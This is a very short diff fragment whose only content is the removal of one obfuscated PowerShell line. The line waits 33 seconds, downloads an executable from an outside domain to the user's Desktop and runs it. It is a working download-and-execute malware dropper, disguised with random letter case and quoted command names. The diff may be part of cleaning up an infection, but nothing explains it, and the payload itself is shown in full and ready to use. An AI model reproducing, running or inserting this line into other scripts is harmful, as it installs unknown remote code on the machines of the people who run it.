@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENvIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::GETfoLderpaTh('Desktop');(&'New-Object' 'System.nET.wEBCLIEnT').DOwNLoADFile.iNvoKE('https://hawkgrute.men/atrvs','$Des\6993462.exe');&'Start-Process' $Des\6993462.exe
